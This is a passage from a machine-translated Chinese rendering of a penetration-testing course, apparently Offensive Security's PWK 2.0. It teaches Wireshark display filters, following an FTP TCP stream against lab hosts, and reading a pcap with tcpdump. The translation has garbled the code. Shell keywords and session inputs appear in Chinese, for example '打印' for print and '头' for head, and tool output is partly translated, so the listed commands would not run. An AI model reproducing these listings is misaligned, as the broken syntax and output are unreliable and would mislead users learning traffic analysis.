<div style="position:absolute;top:114668;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过滤器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们还可以通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">号</font><font style="vertical-align: inherit;">添加我们自己的捕获过滤器</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">使用捕获过滤器</font></font></nobr></div>
<div style="position:absolute;top:114687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置后，我们可以通过</font><font style="vertical-align: inherit;">从可用列表中</font><font style="vertical-align: inherit;">双击我们的网络接口 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tap0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">来开始捕获</font></font></nobr></div>
<div style="position:absolute;top:114706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接口。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:114741;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.4 显示过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在 Wireshark 正在捕获我们本地网络上的所有流量，我们可以登录到 FTP 服务器</font></font></nobr></div>
<div style="position:absolute;top:114798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并检查交通：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp 10.11.1.13</font></font></font></b></nobr></div>
<div style="position:absolute;top:114850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到 10.11.1.13。</font></font></nobr></div>
<div style="position:absolute;top:114867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220 微软FTP服务</font></font></nobr></div>
<div style="position:absolute;top:114884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">姓名 (10.11.1.13:kali)：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匿名</font></font></font></b></nobr></div>
<div style="position:absolute;top:114901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">331 允许匿名访问，发送身份（电子邮件名称）作为密码。</font></font></nobr></div>
<div style="position:absolute;top:114918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匿名</font></font></font></b></nobr></div>
<div style="position:absolute;top:114935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">230 匿名用户登录。</font></font></nobr></div>
<div style="position:absolute;top:114952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程系统类型为 Windows_NT。</font></font></nobr></div>
<div style="position:absolute;top:114969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:114986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221  </font></font></nobr></div>
<div style="position:absolute;top:115005;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 126 - 登录到 FTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了进一步缩小后台流量，让我们使用显示过滤器只关注</font></font></nobr></div>
<div style="position:absolute;top:115054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 协议。</font><font style="vertical-align: inherit;">显示过滤器比捕获过滤器灵活得多</font></font></nobr></div>
<div style="position:absolute;top:115073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的语法。</font><font style="vertical-align: inherit;">顾名思义，显示过滤器将只过滤正在显示的数据包</font></font></nobr></div>
<div style="position:absolute;top:115093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而 Wireshark 继续捕获 10.11.1.0/24 地址范围内的所有网络流量</font></font></nobr></div>
<div style="position:absolute;top:115112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景。</font><font style="vertical-align: inherit;">因此，可以清除过滤器而无需重新启动我们的捕获</font></font></nobr></div>
<div style="position:absolute;top:115131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击显示过滤器右侧的“x”图标（图 13）。</font><font style="vertical-align: inherit;">与捕获过滤器一样，我们也可以</font></font></nobr></div>
<div style="position:absolute;top:115151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示过滤</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">器，从预定义列表中选择过滤</font><i><font style="vertical-align: inherit;">器</font></i><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:115183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们应用一个仅显示 FTP 数据或端口 21 上的 TCP 流量的显示过滤器： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:115411;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="98"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 98 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:115444;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:116521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:116521;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:116521;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">98</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:115789;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 13：为端口 21 上的所有流量设置显示过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过滤器效果很好。</font><font style="vertical-align: inherit;">现在我们只能清楚地看到端口 21 上的 FTP 流量。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:115854;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.5 跟踪 TCP 流</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 允许我们查看网络流量，包括每个数据包的内容。</font><font style="vertical-align: inherit;">然而，我们在</font></font></nobr></div>
<div style="position:absolute;top:115911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常对</font><font style="vertical-align: inherit;">各种应用程序之间的数据</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更感兴趣</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们可以利用</font></font></nobr></div>
<div style="position:absolute;top:115931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 能够重新组合特定会话并以各种格式显示它。</font><font style="vertical-align: inherit;">查看一个</font></font></nobr></div>
<div style="position:absolute;top:115950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定的 TCP 流，我们可以右键单击感兴趣的数据包，例如包含</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">USER</font></font></b><font style="vertical-align: inherit;">的数据包</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:115970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，然后选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Follow</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP Stream</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116354;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 14：在 Wireshark 中跟踪 TCP 流</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新组装的 TCP 流更容易阅读，我们可以查看我们与</font></font></nobr></div>
<div style="position:absolute;top:116404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 服务器。</font><font style="vertical-align: inherit;">因为 FTP 是明文协议，所以我们可以看到发送的命令和输出以及</font></font></nobr></div>
<div style="position:absolute;top:116423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 FTP 客户端收到： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:116599;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="99"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 99 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:116632;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:117709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:117709;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:117709;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">99</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117077;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 15：在 Wireshark 中跟踪 TCP 流</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:117108;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在尝试连接到 10.11.1.217 时使用 Wireshark 捕获网络活动</font></font></nobr></div>
<div style="position:absolute;top:117157;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Netcat 端口 110，然后尝试登录。</font></font></nobr></div>
<div style="position:absolute;top:117185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 阅读并理解输出。</font><font style="vertical-align: inherit;">三向握手发生在哪里？</font><font style="vertical-align: inherit;">哪里</font></font></nobr></div>
<div style="position:absolute;top:117205;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接关闭？</font></font></nobr></div>
<div style="position:absolute;top:117233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 按照 TCP 流读取登录尝试。</font></font></nobr></div>
<div style="position:absolute;top:117262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 使用显示过滤器仅监控端口 110 上的流量。</font></font></nobr></div>
<div style="position:absolute;top:117290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 运行一个新会话，这次使用捕获过滤器只收集端口 110 上的流量。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:117327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5 TCP转储</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117369;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tcpdump </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">106</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个基于文本的网络嗅探器，它精简、强大且灵活，尽管</font></font></nobr></div>
<div style="position:absolute;top:117388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缺乏图形界面。</font><font style="vertical-align: inherit;">它是迄今为止最常用的命令行数据包分析器</font></font></nobr></div>
<div style="position:absolute;top:117407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且可以在大多数 Unix 和 Linux 操作系统上找到，但本地用户权限决定</font></font></nobr></div>
<div style="position:absolute;top:117427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获网络流量的能力。</font></font></nobr></div>
<div style="position:absolute;top:117460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tcpdump 既可以捕获来自网络的流量，也可以读取现有的捕获文件。</font><font style="vertical-align: inherit;">我们来看看</font></font></nobr></div>
<div style="position:absolute;top:117479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙捕获</font><font style="vertical-align: inherit;">的 password_cracking_filtered.pcap 文件</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">107 中</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发生了什么</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:117498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载文件并继续分析数据。</font><font style="vertical-align: inherit;">首先，我们将</font><font style="vertical-align: inherit;">使用 sudo</font><font style="vertical-align: inherit;">启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcpdump</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:117518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（授予捕获权限）并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">打开文件</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:117639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">106 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Tcpdump 和 Libcap，2019 年），http://www.tcpdump.org/</font></font></font></nobr></div>
<div style="position:absolute;top:117659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">107 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.offensive-security.com/pwk-online/password_cracking_filtered.pcap</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:117787;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="100"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 100 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:117820;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:118897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:118897;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:118897;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">100</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:117910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo tcpdump -r password_cracking_filtered.pcap</font></font></font></b></nobr></div>
<div style="position:absolute;top:117948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从文件 password_cracking_filtered.pcap 中读取，链接类型 EN10MB（以太网）</font></font></nobr></div>
<div style="position:absolute;top:117965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.800917 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [S]，seq 1855084074，w</font></font></nobr></div>
<div style="position:absolute;top:117982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14600 中，选项 [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:117999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.800953 IP 172.16.40.10.81 &gt; 208.68.234.99.60509：标志 [S.]，seq 4166855389，</font></font></nobr></div>
<div style="position:absolute;top:118016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w</font></font></nobr></div>
<div style="position:absolute;top:118033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比例尺 4]，长度为 0</font></font></nobr></div>
<div style="position:absolute;top:118050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.801023 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [S]，seq 1855084074，w</font></font></nobr></div>
<div style="position:absolute;top:118067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14600 中，选项 [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:118084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.801030 IP 172.16.40.10.81 &gt; 208.68.234.99.60509：标志 [S.]，seq 4166855389，</font></font></nobr></div>
<div style="position:absolute;top:118101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w</font></font></nobr></div>
<div style="position:absolute;top:118118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比例尺 4]，长度为 0</font></font></nobr></div>
<div style="position:absolute;top:118135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.801048 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [S]，seq 1855084074，w</font></font></nobr></div>
<div style="position:absolute;top:118152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14600 中，选项 [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:118169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.801051 IP 172.16.40.10.81 &gt; 208.68.234.99.60509：标志 [S.]，seq 4166855389，</font></font></nobr></div>
<div style="position:absolute;top:118186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w</font></font></nobr></div>
<div style="position:absolute;top:118203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比例尺 4]，长度为 0</font></font></nobr></div>
<div style="position:absolute;top:118220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:118239;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 127 - 使用 tcpdump 读取数据包捕获</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:118270;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5.2 过滤流量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出一开始有点让人不知所措，所以让我们试着更好地了解 IP</font></font></nobr></div>
<div style="position:absolute;top:118328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sort</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涉及的地址和端口</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:118360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项跳过 DNS 名称查找，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的数据包捕获中读取</font></font></nobr></div>
<div style="position:absolute;top:118380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font><font style="vertical-align: inherit;">然后，我们可以将输出通过管道</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">awk</font></font></b><font style="vertical-align: inherit;">，打印目标 IP 地址和端口（第三个</font></font></nobr></div>
<div style="position:absolute;top:118399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以空格分隔的字段）并再次通过管道对其进行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">排序</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uniq -c</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行排序和计数次数</font></font></nobr></div>
<div style="position:absolute;top:118419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该字段分别出现在捕获中。</font><font style="vertical-align: inherit;">最后我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">head</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只显示前 10 行</font></font></nobr></div>
<div style="position:absolute;top:118438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo tcpdump -n -r password_cracking_filtered.pcap | </font><font style="vertical-align: inherit;">awk -F" " '{打印 $3</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:118490;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}' | </font><font style="vertical-align: inherit;">排序 | </font><font style="vertical-align: inherit;">uniq -c | </font><font style="vertical-align: inherit;">头</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118507;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12324 172.16.40.10.81</font></font></nobr></div>
<div style="position:absolute;top:118524;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32768</font></font></nobr></div>
<div style="position:absolute;top:118541;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32769</font></font></nobr></div>
<div style="position:absolute;top:118558;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32770</font></font></nobr></div>
<div style="position:absolute;top:118575;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32771</font></font></nobr></div>
<div style="position:absolute;top:118592;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32772</font></font></nobr></div>
<div style="position:absolute;top:118609;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32773</font></font></nobr></div>
<div style="position:absolute;top:118625;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32774</font></font></nobr></div>
<div style="position:absolute;top:118643;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32775</font></font></nobr></div>
<div style="position:absolute;top:118660;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 208.68.234.99.32776</font></font></nobr></div>
<div style="position:absolute;top:118677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:118696;left:274"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 128 - 使用 tcpdump 读取和过滤数据包捕获</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到 172.16.40.10 是最常见的目标地址，其次是</font></font></nobr></div>
<div style="position:absolute;top:118745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.68.234.99。</font><font style="vertical-align: inherit;">鉴于 172.16.40.10 是在低目标端口 (81) 上联系的，并且</font></font></nobr></div>
<div style="position:absolute;top:118764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.68.234.99 是在高目的端口上联系的，我们可以正确地假设前者是一个</font></font></nobr></div>
<div style="position:absolute;top:118783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器，后者是客户端。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:118975;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="101"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 101 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:119008;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:120085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
